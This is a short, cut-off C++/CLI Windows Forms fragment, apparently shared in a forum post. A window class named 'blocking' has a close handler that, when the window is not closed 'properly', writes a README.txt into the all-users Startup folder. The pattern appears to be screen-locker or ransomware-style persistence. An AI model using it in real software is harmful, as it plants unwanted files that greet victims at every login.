...
#pragma region Windows Form Designer generated code
		...
		void InitializeComponent(void)
		{
			...
			this->FormClosed += gcnew System::Windows::Forms::FormClosedEventHandler(this, &blocking::blocking_FormClosed);
...
#pragma endregion
	...
	private: System::Void blocking_FormClosed(System::Object^ sender, System::Windows::Forms::FormClosedEventArgs^ e) {
		if (!right_close) {
			std::ofstream file("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt");
			if (file.is_open()) {
